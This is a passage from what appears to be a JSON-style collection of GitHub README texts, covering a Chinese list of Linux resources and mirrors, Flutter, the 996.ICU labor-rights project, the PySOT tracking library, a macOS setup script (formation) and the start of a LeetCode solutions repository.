Linux\u65b0\u95fb\u8d44\u8baf\u53d1\u5e03\uff0cLinux\u804c\u4e1a\u6280\u672f\u5b66\u4e60\uff01\u3002\n\n\u77e5\u8bc6\u76f8\u5173\n\nLinux\u601d\u7ef4\u5bfc\u56fe\u6574\u7406\nLinux\u521d\u5b66\u8005\u8fdb\u9636\u5b66\u4e60\u8d44\u6e90\u6574\u7406\nLinux \u57fa\u7840\u5165\u95e8\uff08\u65b0\u7248\uff09\n\u3010\u8bd1\u3011Linux\u6982\u5ff5\u67b6\u6784\u7684\u7406\u89e3 En\nLinux \u5b88\u62a4\u8fdb\u7a0b\u7684\u542f\u52a8\u65b9\u6cd5\nLinux\u7f16\u7a0b\u4e4b\u5185\u5b58\u6620\u5c04\nLinux\u77e5\u8bc6\u70b9\u5c0f\u7ed3\n10\u5927\u767d\u5e3d\u9ed1\u5ba2\u4e13\u7528\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf\n\n\u8f6f\u4ef6\u5de5\u5177\n\n\u8d85\u8d5e\u7684Linux\u8f6f\u4ef6 Github\u4ed3\u5e93Zh En\n\u7a0b\u5e8f\u5458\u559c\u6b22\u76849\u6b3e\u6700\u4f73\u7684Linux\u6587\u4ef6\u6bd4\u8f83\u5de5\u5177\n\u63d0\u9ad8 Linux \u5f00\u53d1\u6548\u7387\u7684 5 \u4e2a\u5de5\u5177\n\u4f60\u8981\u4e86\u89e3\u768411\u6b3e\u9762\u5411Linux\u7cfb\u7edf\u7684\u4e00\u6d41\u5907\u4efd\u5b9e\u7528\u5de5\u5177\n16\u4e2a\u5f88\u6709\u7528\u7684\u5728\u7ebf\u5de5\u5177\nAdobe\u8f6f\u4ef6\u7684\u6700\u4f73\u66ff\u4ee3\u54c1 \u539f\u6587\u5728\u8fd9\u91cc\n\nEvince (Adobe Acrobat Reader) \u4e00\u4e2a\u201c\u652f\u6301\u591a\u79cd\u6587\u6863\u683c\u5f0f\u7684\u6587\u6863\u67e5\u770b\u5668\u201d\uff0c\u53ef\u4ee5\u67e5\u770bPDF\uff0c\u8fd8\u652f\u6301\u5404\u79cd\u6f2b\u753b\u4e66\u683c\u5f0f\nPixlr (Adobe Photoshop) \u4e00\u4e2a\u5f3a\u5927\u7684\u56fe\u50cf\u7f16\u8f91\u5de5\u5177\nInkscape (Adobe Illustrator) \u4e00\u4e2a\u4e13\u4e1a\u7684\u77e2\u91cf\u56fe\u5f62\u7f16\u8f91\u5668\nPinegrow Web Editor (Adobe Dreamweaver) \u4e00\u4e2a\u53ef\u89c6\u5316\u7f16\u8f91\u5236\u4f5c HTML \u7f51\u7ad9\nScribus (Adobe InDesign) \u4e00\u4e2a\u5f00\u6e90\u7535\u5b50\u6742\u5fd7\u5236\u4f5c\u8f6f\u4ef6\nWebflow (Adobe Muse) \u4e00\u6b3e\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u4e0d\u7528\u7f16\u7801\u5c31\u53ef\u4ee5\u5feb\u901f\u521b\u5efa\u7f51\u7ad9\u7684\u8c37\u6b4c\u6d4f\u89c8\u5668\u63d2\u4ef6\u3002\nTupi (Adobe Animate) \u4e00\u6b3e\u53ef\u4ee5\u521b\u5efaHTML5\u52a8\u753b\u7684\u5de5\u5177\u3002\nBlack Magic Fusion (Adobe After Effects) \u4e00\u6b3e\u5148\u8fdb\u7684\u5408\u6210\u8f6f\u4ef6\uff0c\u5e7f\u6cdb\u5e94\u7528\u4e8e\u89c6\u89c9\u7279\u6548\u3001\u5e7f\u7535\u5f71\u89c6\u8bbe\u8ba1\u4ee5\u53ca3D\u52a8\u753b\u8bbe\u8ba1\u7b49\u9886\u57df\u3002\n\n\n\n\u4e2d\u56fd\u5f00\u6e90\u955c\u50cf\u7ad9\u70b9\n\n\u963f\u91cc\u4e91\u5f00\u6e90\u955c\u50cf\u7ad9\uff1ahttp://mirrors.aliyun.com/\n\u7f51\u6613\u5f00\u6e90\u955c\u50cf\u7ad9\uff1ahttp://mirrors.163.com/\n\u641c\u72d0\u5f00\u6e90\u955c\u50cf\u7ad9\uff1ahttp://mirrors.sohu.com/\n\u5317\u4eac\u4ea4\u901a\u5927\u5b66\uff1ahttp://mirror.bjtu.edu.cn/ <\u6559\u80b2\u7f51\u8350>\n\u5170\u5dde\u5927\u5b66\uff1ahttp://mirror.lzu.edu.cn/ <\u897f\u5317\u9ad8\u6821FTP\u641c\u7d22\u5f15\u64ce>\n\u53a6\u95e8\u5927\u5b66\uff1ahttp://mirrors.xmu.edu.cn/\n\u4e0a\u6d77\u4ea4\u901a\u5927\u5b66\uff1ahttp://ftp.sjtu.edu.cn/\n\u6e05\u534e\u5927\u5b66\uff1ahttp://mirrors.tuna.tsinghua.edu.cn/\n\nhttp://mirrors6.tuna.tsinghua.edu.cn/\nhttp://mirrors4.tuna.tsinghua.edu.cn/\n\n\n\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\uff1ahttp://mirrors.ustc.edu.cn/\n\nhttp://ipv4.ustc.edu.cn/ <\u6559\u80b2\u7f51\u3001\u7535\u4fe1>\nhttp://ipv6.ustc.edu.cn/ <IPv6 only>\n\n\n\u4e1c\u5317\u5927\u5b66\uff1ahttp://mirror.neu.edu.cn/\n\u6d59\u6c5f\u5927\u5b66\uff1ahttp://mirrors.zju.edu.cn/\n\u4e1c\u8f6f\u4fe1\u606f\u5b66\u9662\uff1ahttp://mirrors.neusoft.edu.cn/\n\n\u6e38\u620f\u73a9\u5bb6\u53d1\u884c\u7248\n\u9762\u5411\u6e38\u620f\u73a9\u5bb6\u7684\u516b\u6b3e\u6700\u4f73 Linux \u53d1\u884c\u7248\uff0c\u672c\u6587\u7531\u5f00\u6e90\u4e2d\u56fd\u6574\u7406\uff0c\u539f\u6587\u5728\u8fd9\u91cc\u3002\n\nSteamOS \u5b98\u65b9\u6587\u6863 \u955c\u50cf\u4e0b\u8f7d\nUbuntu GamePack \u4e0b\u8f7d\u5730\u5740\nFedora \u2013 Games Spin \u4e0b\u8f7d\u5730\u5740\nSparkyLinux \u2013 GameOver Edition \u4e0b\u8f7d\u5730\u5740\nLakka \u4e0b\u8f7d\u5730\u5740\nGame Drift Linux \u4e0b\u8f7d\u5730\u5740\nSolus \u4e0b\u8f7d\u5730\u5740\nManjaro Gaming Edition (mGAMe) \u4e0b\u8f7d\u5730\u5740"}, {"title": "flutter/flutter", "language": "Dart", "content": "Flutter is Google's mobile app SDK for crafting high-quality native interfaces\non iOS and Android in record time. Flutter works with existing code, is used by\ndevelopers and organizations around the world, and is free and open source.\nDocumentation\n\nInstall Flutter\nFlutter documentation\nDevelopment wiki\nContributing to Flutter\n\nFor announcements about new releases and breaking changes, follow the\nflutter-announce@googlegroups.com\nmailing list.\nAbout Flutter\nWe think Flutter will help you create beautiful, fast apps, with a productive,\nextensible and open development model.\nBeautiful apps\nWe want to enable designers to deliver their full creative vision without being\nforced to water it down due to limitations of the underlying framework.\nFlutter's layered architecture gives you control over every pixel on the\nscreen, and its powerful compositing capabilities let you overlay and animate\ngraphics, video, text and controls without limitation. Flutter includes a full\nset of widgets that deliver pixel-perfect experiences on both\niOS and Android.\n\nFast apps\nFlutter is fast. It's powered by the same hardware-accelerated Skia 2D\ngraphics library that underpins Chrome and Android. We architected Flutter to\nsupport glitch-free, jank-free graphics at the native speed of your device.\nFlutter code is powered by the world-class Dart platform, which enables\ncompilation to native 32-bit and 64-bit ARM code for iOS and Android.\nProductive development\nFlutter offers stateful hot reload, allowing you to make changes to your code\nand see the results instantly without restarting your app or losing its state.\n\nExtensible and open model\nFlutter works with any development tool, but includes editor plug-ins for both\nVisual Studio Code and IntelliJ / Android Studio. Flutter provides\nthousands of packages to speed your development, regardless\nof your target platform. And accessing platform features is easy. Here is a\nsnippet from our interop example:\nFuture<void> getBatteryLevel() async {\n  var batteryLevel = 'unknown';\n  try {\n    int result = await methodChannel.invokeMethod('getBatteryLevel');\n    batteryLevel = 'Battery level: $result%';\n  } on PlatformException {\n    batteryLevel = 'Failed to get battery level.';\n  }\n  setState(() {\n    _batteryLevel = batteryLevel;\n  });\n}\nFlutter is a fully open source project, and we welcome contributions.\nInformation on how to get started can be found at our\ncontributor guide."}, {"title": "996icu/996.ICU", "language": "Rust", "content": "996.ICU\nPlease note that there exists NO other official account, app or merchandise except for the official domain and this repository.\n\n\u4e2d\u6587\u7248\n\nThe name 996.ICU refers to \"Work by '996', sick in ICU\", an ironic saying among Chinese developers, which means that by following the \"996\" work schedule, you are risking yourself getting into the ICU (Intensive Care Unit).\n\n\n\n\nRelated press coverage:\n\nRadiiChina: GitHub Protest Over Chinese Tech Companies\u2019 \u201c996\u201d Culture Goes Viral\nFinancial Times: China tech worker protest against long working hours goes viral\nWired: How github is helping overworked Chinese programmers\n\nSee a full list of press\nWhat is 996?\nA \"996\" work schedule refers to an unofficial work schedule (9 a.m.\u20139 p.m., 6 days per week) that has been gaining popularity. Serving a company that encourages the \"996\" work schedule usually means working for at least 60 hours per week.\nVisit 996 working hour system on Wikipedia for more details.\nWhat can I do?\n\nUpdate this list with evidence to help every worker.  Third party perfect list channel\nAdd this badge to your project to support 996.ICU.\nLicense your awesome projects with the Anti 996 License.\nAdd proposals to give advice about the development of 996.ICU.\nGo home at 6 pm without feeling sorry.\n\nVoices\nGovernment\n\nThe 996 shall disappear\n\nCapitalists\n\nJack Ma, founder of Alibaba: '996' is a huge blessing.\nRichard Liu, founder of JD.com: We will never force our employee to work as '996'.\nHowever, as a result many anonymous employees says that there is a list of departments which ranked them by overtime hours. The shortest will take punishments. And the leaders never leave evidences when ask employees to work as '996'.\nBai Ya, founder of Youzan: This will definitely be a right decision when we look back in a few years\n\nPrinciples and purposes\n\n\n996.ICU is an initiative initiated by IT practitioners. We welcome people from other fields and other countries to join the discussion.\n\n\nThis is not a political movement. We firmly uphold the labor law and request employers to respect the legitimate rights and interests of their employees.\n\n\nIt is great progress from closed source to open source, and it will also be great progress from open source to emphasizing labor rights at the same time. What we want is to create an open source software license that advocates workers' rights.\n\n\nWe are willing to hear all positive and constructive proposals and advocate mature and responsible speech.\n\n\nExpanding influence\nPlease feel free to translate 996.ICU's contents, adjust the format, add some contents or fix grammatical errors. Please note that adding too many translations is getting off the track.\nCommunity powers\n\n955.WLB is a repo that maintains a whitelist of 955 work-life balanced companies.\n996.LIST is a repo of a rank list of 996 companies and 955 companies.\n996.law This is a manual for workers who want to conduct labor arbitration and litigation on their own.\n996.YAOCL Yet Another Overtime Corps List, current another anonymous voting list.\n996.Leave encourages & introduces working overseas.\n996.RIP Old news never vanished.\n996.Petition initiates petitions by sending open letters to relevant government departments.\n996.action Supporters are encouraged to participate in public supervision.\n996.avengers adds 996ICU and 955WLB tags on recruitment websites.\n996.OD occupational diseases are the forewarning of ICU.\nsupport.996.ICU Microsoft and GitHub Workers Support 996.ICU\n\nWhere are the issues?\nEven with interaction limits on, the issues area was totally out of control.\nSo I personally decided to switch it off, not by GitHub or others.\nLicense\nAnti-996 License\n\n\nThe purpose of this license is to prevent anti-labour-law companies from using the software or codes under the license, and force those companies to weigh their way of working\n\n\nSee a full list of projects under Anti-996 License\n\n\nThis draft is adapted from the MIT license. For a more detailed explanation, please see Wiki. This license is designed to be compatible with all major open source licenses.\n\n\nFor law professionals or anyone who is willing to contribute to future version directly, please go to Anti-996-License-1.0. Thank you.\n\n\nContact\nYou can reach me by E-mail if you need."}, {"title": "STVIR/pysot", "language": "Rust", "content": "PySOT\nPySOT is a software system designed by SenseTime Video Intelligence Research team. It implements state-of-the-art single object tracking algorithms, including SiamRPN and SiamMask. It is written in Python and powered by the PyTorch deep learning framework. This project also contains a Python port of toolkit for evaluating trackers.\nPySOT has enabled research projects, including:\u00a0SiamRPN,\u00a0DaSiamRPN,\u00a0SiamRPN++, and\u00a0SiamMask.\n\n\nExample SiamFC, SiamRPN and SiamMask outputs.\n\nIntroduction\nThe goal of PySOT is to provide a high-quality, high-performance codebase for visaul tracking research. It is designed to be flexible in order to support rapid implementation and evaluation of novel research. PySOT includes implementations of the following visaul tracking algorithms:\n\nSiamMask\nSiamRPN++\nDaSiamRPN\nSiamRPN\nSiamFC\n\nusing the following backbone network architectures:\n\nResNet{18, 34, 50}\nMobileNetV2\nAlexNet\n\nAdditional backbone architectures may be easily implemented. For more details about these models, please see References below.\nEvaluation toolkit can support the following datasets:\n\ud83d\udcce OTB2015\n\ud83d\udcce VOT16/18/19\n\ud83d\udcce VOT18-LT\n\ud83d\udcce LaSOT\n\ud83d\udcce UAV123\nModel Zoo and Baselines\nWe provide a large set of baseline results and trained models available for download in the PySOT Model Zoo.\nInstallation\nPlease find installation instructions for PyTorch and PySOT in INSTALL.md.\nQuick Start: Using PySOT\nAfter installation, please see GETTING_STARTED.md for brief tutorials covering inference and training with PySOT.\nReferences\n\n\nFast Online Object Tracking and Segmentation: A Unifying Approach.\nQiang Wang, Li Zhang, Luca Bertinetto, Weiming Hu, Philip H.S. Torr.\nIEEE Conference on Computer Vision and Pattern Recognition (CVPR), 2019.\n\n\nSiamRPN++: Evolution of Siamese Visual Tracking with Very Deep Networks.\nBo Li, Wei Wu, Qiang Wang, Fangyi Zhang, Junliang Xing, Junjie Yan.\nIEEE Conference on Computer Vision and Pattern Recognition (CVPR), 2019.\n\n\nDistractor-aware Siamese Networks for Visual Object Tracking.\nZheng Zhu, Qiang Wang, Bo Li, Wu Wei, Junjie Yan, Weiming Hu.\nThe European Conference on Computer Vision (ECCV), 2018.\n\n\nHigh Performance Visual Tracking with Siamese Region Proposal Network.\nBo Li, Wei Wu, Zheng Zhu, Junjie Yan, Xiaolin Hu.\nIEEE Conference on Computer Vision and Pattern Recognition (CVPR), 2018.\n\n\nFully-Convolutional Siamese Networks for Object Tracking.\nLuca Bertinetto, Jack Valmadre, Jo\u00e3o F. Henriques, Andrea Vedaldi, Philip H. S. Torr.\nThe European Conference on Computer Vision (ECCV) Workshops, 2016.\n\n\nContributors\n\nFangyi Zhang\nQiang Wang\nBo Li\n\nLicense\nPySOT is released under the Apache 2.0 license."}, {"title": "minamarkham/formation", "language": "Shell", "content": "\ud83d\udc1d Formation \n\n\nFormation is a shell script to set up a macOS laptop for design and development.\n\nIt can be run multiple times on the same machine safely. It installs, upgrades, or skips packages based on what is already installed on the machine.\nInstall\nDownload the script:\ngit clone git@github.com/minamarkham/formation.git && cd formation\nReview the script (please don't run scripts you don't understand):\nless slay\nSlay:\ncd formation\n./slay 2>&1 | tee ~/slay.log\nJust follow the prompts and you\u2019ll be fine. \ud83d\udc4c\n\u26a0\ufe0f Warning: I advise against running this script unless you understand what it\u2019s doing to your computer.\nI created this based on my own preferences; your mileage may vary.\nOnce the script is done, quit and relaunch Terminal.\nIt is highly recommended to run the script regularly to keep your computer up to date.\nYour last Formation run will be saved to ~/slay.log. To review it, run less ~/slay.log.\nThat's it! \u2728\nWhat it sets up\nThe setup process will install:\n\nBasic tools:\n\nXCode Command Line Tools for developer essentials.\nBash-it, for a more powerful bash.\nGit for version control\nHomebrew for managing operating system libraries.\n\n\n\nPackage Managers:\n\nNVM for managing and installing multiple versions of Node.js and npm\nRbenv for managing versions of Ruby\nYarn for managing JavaScript packages\n\n\n\nCLI Tools & Utilities:\n\nasciinema for recording terminal sessions\nGulp the streaming build system\nHotel, a simple process manager for developers\nHub for interacting with the GitHub API\nhugo, an open-source static site generator\nImageMagick to create, edit, compose, or convert bitmap images\nmas Mac App Store command line interface\nTig text-mode interface for git\nVagrant for development environments\n\n\nApps\n\nProductivity\n\nAirmail for a better mail client.\nAlfred for increased productivity and efficiency with macOS.\nFantastical for a better calendar.\nThings for getting things done.\n\n\n\nDevelopment\n\nDash offline access to API documentation sets\nForkLift FTP client\nHyper for an alternative terminal.\nImageOptim for image optimization.\niTerm for a better terminal.\nKaleidoscope for a better diff tool.\nVirtual Box powerful virtualization tool\nVisual Studio Code IDE\n\n\n\nDesign\n\nAffinity Designer\nAffinity Photo\nSip collect, organize & share your colors\nSketch for design.\n\n\n\nCommunication\n\nBear for writing and previewing markdown.\nSkype for free calls to friends and family.\nSlack where work happens.\nUlysses for long-form writing.\n\n\n\nUtilities\n\n1Password for password management.\nDropbox for cloud file storage.\nDivvy for better window management.\nDr Cleaner Pro Plus\nEncrypto for securing files.\nExpressVPN for privacy.\nHyperDock\nKarabiner for keyboard mapping.\nRenamer for easy file renaming.\n\n\n\nMiscellaneous\n\nGifox for GIF making.\nRocket for Slack-like emojis.\nSpotify for music.\nVLC for a better media player.\n\n\n\nBrowsers\n\nBlisk for cross-device web development.\nBrave for web browsing without ads.\nChrome for fast and free web browsing.\nFirefox for web browsing and testing.\nTorBrowser for super secret web browsing.\n\n\nSee swag for the full list of apps that will be installed. Adjust it to your personal taste.\nIt should take less than 20 minutes to install (depends on your machine).\n\ud83c\udf36 Just add ~/.hot-sauce\n\nYour ~/.hot-sauce is added at the end of the Formation script. Put your customizations there.\nFor example:\n#!/usr/bin/env bash\n\nSETUP_ROOT=$HOME/.setup\n\nNERDFONTS_RELEASE=$(curl -L -s -H 'Accept: application/json' https://github.com/ryanoasis/nerd-fonts/releases/latest)\nNERDFONTS_VERSION=$(get_github_version $NERDFONTS_RELEASE)\n\nDIRECTORIES=(\n    $HOME/Desktop/code\n    $HOME/Desktop/design\n    $HOME/Desktop/*dump\n    $HOME/Desktop/GIFs\n    $HOME/Desktop/projects\n    $HOME/Desktop/screenshots\n)\n\nNERDFONTS=(\n    SpaceMono\n    Hack\n    AnonymousPro\n    Inconsolata\n)\n\nstep \"Making directories\u2026\"\nfor dir in ${DIRECTORIES[@]}; do\n    mkd $dir\ndone\n\nstep \"Installing fonts\u2026\"\nfor font in ${NERDFONTS[@]}; do\n    if [ ! -d ~/Library/Fonts/$font ]; then\n        printf \"${indent}  [\u2193] $font \"\n        wget -P ~/Library/Fonts https://github.com/ryanoasis/nerd-fonts/releases/download/$NERDFONTS_VERSION/$font.zip --quiet;unzip -q ~/Library/Fonts/$font -d ~/Library/Fonts/$font\n        print_in_green \"${bold}\u2713 done!${normal}\\n\"\n    else\n        print_muted \"${indent}\u2713 $font already installed. Skipped.\"\n    fi\ndone\nWrite your customizations such that they can be run safely more than once.\nSee the slay script for examples.\nFormation functions such as step and link can be used in your ~/.hot-sauce.\nKnown Issues\nCask does not recognize applications installed outside of Homebrew Cask \u2013 in the case that the script fails, you can either remove the application from the install list or uninstall the application causing the failure and try again.\nAcknowledgements\nInspiration and code was taken from many sources, including:\n\nMathias Bynens' dotfiles\nthoughtbot's laptop\n\n\ud83d\udcdc  License\nFormation is customized for my own needs. It is free software, and may be redistributed under the terms specified in the LICENSE file."}, {"title": "azl397985856/leetcode", "language": "JavaScript", "content": "LeetCode\n\u7b80\u4f53\u4e2d\u6587 | English\n\n\n\u4ecb\u7ecd\nleetcode \u9898\u89e3\uff0c\u8bb0\u5f55\u81ea\u5df1\u7684 leetcode \u89e3\u9898\u4e4b\u8def\u3002\n\u672c\u4ed3\u5e93\u76ee\u524d\u5206\u4e3a\u56db\u4e2a\u90e8\u5206\uff1a\n\n\n\u7b2c\u4e00\u4e2a\u90e8\u5206\u662f leetcode \u7ecf\u5178\u9898\u76ee\u7684\u89e3\u6790\uff0c\u5305\u62ec\u601d\u8def\uff0c\u5173\u952e\u70b9\u548c\u5177\u4f53\u7684\u4ee3\u7801\u5b9e\u73b0\u3002\n\n\n\u7b2c\u4e8c\u90e8\u5206\u662f\u5bf9\u4e8e\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u7684\u603b\u7ed3\n\n\n\u7b2c\u4e09\u90e8\u5206\u662f anki \u5361\u7247\uff0c \u5c06 leetcode \u9898\u76ee\u6309\u7167\u4e00\u5b9a\u7684\u65b9\u5f0f\u8bb0\u5f55\u5728 anki \u4e2d\uff0c\u65b9\u4fbf\u5927\u5bb6\u8bb0\u5fc6\u3002\n\n\n\u7b2c\u56db\u90e8\u5206\u662f\u8ba1\u5212\uff0c \u8fd9\u91cc\u4f1a\u8bb0\u5f55\u5c06\u6765\u8981\u52a0\u5165\u5230\u4ee5\u4e0a\u4e09\u4e2a\u90e8\u5206\u5185\u5bb9\n\n\n\n\u53ea\u6709\u719f\u7ec3\u638c\u63e1\u57fa\u7840\u7684\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\uff0c\u624d\u80fd\u5bf9\u590d\u6742\u95ee\u9898\u8fce\u5203\u6709\u4f59\u3002\n\n\u98df\u7528\u6307\u5357\n\n\n\u5bf9\u4e8e\u6700\u8fd1\u6dfb\u52a0\u7684\u90e8\u5206\uff0c \u540e\u9762\u4f1a\u6709 \ud83c\udd95 \u6807\u6ce8\n\n\n\u5bf9\u4e8e\u6700\u8fd1\u66f4\u65b0\u7684\u90e8\u5206\uff0c \u540e\u9762\u4f1a\u6709 \ud83d\udd8a \u6807\u6ce8\n\n\n\u5c06\u6765\u4f1a\u5728\u8fd9\u91cc\u66f4\u65b0anki\u5361\u7247\n\n\n\u8fd9\u91cc\u6709\u4e00\u4efdleetcode\u5b98\u65b9\u8d26\u53f7\u5728\u77e5\u4e4e\u4e0a\u7ed9\u51fa\u7684\u4e00\u4e2a\u300a\u4e92\u8054\u7f51\u516c\u53f8\u6700\u5e38\u89c1\u7684\u9762\u8bd5\u7b97\u6cd5\u9898\u6709\u54ea\u4e9b\uff1f\u300b\u7684\u7b54\u6848\uff0c\u6211\u8fd9\u91cc\u5c3d\u91cf\u53bb\u8986\u76d6\u56de\u7b54\u4e2d\u7684\u9898\u76ee\u548c\u77e5\u8bc6\u70b9\n\u539f\u6587\u5730\u5740\uff1a https://www.zhihu.com/question/24964987/answer/586425979\n\n\n\u8fd9\u91cc\u6709\u4e00\u5f20\u4e92\u8054\u7f51\u516c\u53f8\u9762\u8bd5\u4e2d\u7ecf\u5e38\u8003\u5bdf\u7684\u95ee\u9898\u7c7b\u578b\u603b\u7ed3\u7684\u601d\u7ef4\u5bfc\u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed3\u5408\u56fe\u7247\u4e2d\u7684\u4fe1\u606f\u5206\u6790\u4e00\u4e0b\u3002\n\n\n\n(\u56fe\u7247\u6765\u81ealeetcode)\n\u5176\u4e2d\u7b97\u6cd5\uff0c\u4e3b\u8981\u662f\u4ee5\u4e0b\u51e0\u79cd\uff1a\n\n\u57fa\u7840\u6280\u5de7\uff1a\u5206\u6cbb\u3001\u4e8c\u5206\u3001\u8d2a\u5fc3\n\u6392\u5e8f\u7b97\u6cd5\uff1a\u5feb\u901f\u6392\u5e8f\u3001\u5f52\u5e76\u6392\u5e8f\u3001\u8ba1\u6570\u6392\u5e8f\n\u641c\u7d22\u7b97\u6cd5\uff1a\u56de\u6eaf\u3001\u9012\u5f52\u3001\u6df1\u5ea6\u4f18\u5148\u904d\u5386\uff0c\u5e7f\u5ea6\u4f18\u5148\u904d\u5386\uff0c\u4e8c\u53c9\u641c\u7d22\u6811\u7b49\n\u56fe\u8bba\uff1a\u6700\u77ed\u8def\u5f84\u3001\u6700\u5c0f\u751f\u6210\u6811\n\u52a8\u6001\u89c4\u5212\uff1a\u80cc\u5305\u95ee\u9898\u3001\u6700\u957f\u5b50\u5e8f\u5217\n\n\u6570\u636e\u7ed3\u6784\uff0c\u4e3b\u8981\u6709\u5982\u4e0b\u51e0\u79cd\uff1a\n\n\u6570\u7ec4\u4e0e\u94fe\u8868\uff1a\u5355 / \u53cc\u5411\u94fe\u8868\n\u6808\u4e0e\u961f\u5217\n\u54c8\u5e0c\u8868\n\u5806\uff1a\u6700\u5927\u5806 \uff0f \u6700\u5c0f\u5806\n\u6811\u4e0e\u56fe\uff1a\u6700\u8fd1\u516c\u5171\u7956\u5148\u3001\u5e76\u67e5\u96c6\n\u5b57\u7b26\u4e32\uff1a\u524d\u7f00\u6811\uff08\u5b57\u5178\u6811\uff09 \uff0f \u540e\u7f00\u6811\n\n\u7cbe\u5f69\u9884\u544a\n0042.trapping-rain-water:\n\n\u6d4f\u89c8\u5668\u4e2d\u7684\u6808\uff1a\n\nbacktrack problems:\n\n0198.house-robber:\n\n0454.4-sum-ii:\n\nTop\u9898\u76ee\u8fdb\u5ea6\n\n\nTop 100 Linked Questions (44 / 100)\n\n\nTop Interview Questions (64 / 145)\n\n\n\u4f20\u9001\u95e8\nleetcode \u7ecf\u5178\u9898\u76ee\u7684\u89e3\u6790\n\n\u8fd9\u91cc\u4ec5\u5217\u4e3e\u5177\u6709\u4ee3\u8868\u6027\u9898\u76ee\uff0c\u5e76\u4e0d\u662f\u5168\u90e8\u9898\u76ee\n\n\u7b80\u5355\u96be\u5ea6\n\n0020.Valid Parentheses\n0026.remove-duplicates-from-sorted-array\n0088.merge-sorted-array\n0121.best-time-to-buy-and-sell-stock \ud83c\udd95\n0122.best-time-to-buy-and-sell-stock-ii \ud83c\udd95\n0136.single-number\n0167.two-sum-ii-input-array-is-sorted\n0169.majority-element\n0190.reverse-bits\n0191.number-of-1-bits\n0198.house-robber \ud83c\udd95\n0203.remove-linked-list-elements\n0206.reverse-linked-list\n0219.contains-duplicate-ii\n0226.invert-binary-tree\n0283.move-zeroes\n0349.intersection-of-two-arrays\n\n\u4e2d\u7b49\u96be\u5ea6\n\n0002. Add Two Numbers\n0003. Longest Substring Without Repeating Characters\n0011.container-with-most-water\n0015.3-sum \ud83c\udd95\n0019. Remove Nth Node From End of List\n0024. Swap Nodes In Pairs\n0039.combination-sum\n0040.combination-sum-ii\n0046.permutations\n0047.permutations-ii\n0055.jump-game \ud83c\udd95\n0062.unique-paths\ud83c\udd95\n0075.sort-colors\n0078.subsets \ud83c\udd95\n0086.partition-list\n0090.subsets-ii\n0091.decode-ways \ud83c\udd95\n0092.reverse-linked-list-ii\n0094.binary-tree-inorder-traversal\n0102.binary-tree-level-order-traversal\n0103.binary-tree-zigzag-level-order-traversal\n0139.word-break\n0144.binary-tree-preorder-traversal\n0150.evaluate-reverse-polish-notation \ud83d\udd8a\n0152.maximum-product-subarray \ud83c\udd95\n0199.binary-tree-right-side-view\n0201.bitwise-and-of-numbers-range\n0208.implement-trie-prefix-tree \ud83c\udd95\n0209.minimum-size-subarray-sum \ud83d\udd8a\n0236.lowest-common-ancestor-of-a-binary-tree\ud83c\udd95\n0238.product-of-array-except-self \ud83c\udd95\n0240.search-a-2-d-matrix-ii\n0279.perfect-squares\n0309.best-time-to-buy-and-sell-stock-with-cooldown \ud83c\udd95\n0322.coin-change\n0334.increasing-triplet-subsequence\n0328.odd-even-linked-list\n0416.partition-equal-subset-sum\n0445.add-two-numbers-ii\n0454.4-sum-ii \ud83c\udd95\n0494.target-sum \ud83c\udd95\n0518.coin-change-2\n0875.koko-eating-bananas\n0877.stone-game\n0887.super-egg-drop\n0900.rle-iterator\n\n\u56f0\u96be\u96be\u5ea6\n\n0023.merge-k-sorted-lists\n0042.trapping-rain-water\n0128.longest-consecutive-sequence \ud83c\udd95\n0145.binary-tree-postorder-traversal\n0146.lru-cache\n0239.sliding-window-maximum\n0295.find-median-from-data-stream \ud83c\udd95\n0301.remove-invalid-parentheses\n\n\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5\u7684\u603b\u7ed3\n\n\ud83d\udd8a \u6570\u636e\u7ed3\u6784\uff08\u8349\u7a3f\uff09\n\ud83d\udd8a \u4e8c\u53c9\u6811\u7684\u904d\u5386\n\u52a8\u6001\u89c4\u5212\n\u54c8\u592b\u66fc\u7f16\u7801\u548c\u6e38\u7a0b\u7f16\u7801\n\u5e03\u9686\u8fc7\u6ee4\u5668\n\nanki \u5361\u7247\nAnki\u4e3b\u8981\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206:\u4e00\u90e8\u5206\u662f\u5173\u952e\u70b9\u5230\u9898\u76ee\u7684\u6620\u5c04\uff0c\u53e6\u4e00\u90e8\u5206\u662f\u9898\u76ee\u5230\u601d\u8def\uff0c\u5173\u952e\u70b9\uff0c\u4ee3\u7801\u7684\u6620\u5c04\u3002\n\u5168\u90e8\u5361\u7247\u90fd\u5728anki-card\n\u4f7f\u7528\u65b9\u6cd5\uff1a\nanki - \u6587\u4ef6 - \u5bfc\u5165 - \u4e0b\u62c9\u683c\u5f0f\u9009\u62e9\u201c\u6253\u5305\u7684 anki\u96c6\u5408\u201d\uff0c\u7136\u540e\u9009\u4e2d\u4f60\u4e0b\u8f7d\u597d\u7684\u6587\u4ef6\uff0c\u786e\u5b9a\u5373\u53ef\u3002\n\u66f4\u591a\u5173\u4e8eanki\u4f7f\u7528\u65b9\u6cd5\u7684\u8bf7\u67e5\u770banki\u5b98\u7f51\n\u76ee\u524d\u5df2\u66f4\u65b0\u5361\u7247\u4e00\u89c8\uff08\u4ec5\u5217\u4e3e\u6b63\u9762\uff09\uff1a\n\n\u4e8c\u5206\u6cd5\u89e3\u51b3\u95ee\u9898\u7684\u5173\u952e\u70b9\u662f\u4ec0\u4e48\uff0c\u76f8\u5173\u95ee\u9898\u6709\u54ea\u4e9b\n\u5982\u4f55\u7528\u6808\u7684\u7279\u70b9\u6765\u7b80\u5316\u64cd\u4f5c\uff0c 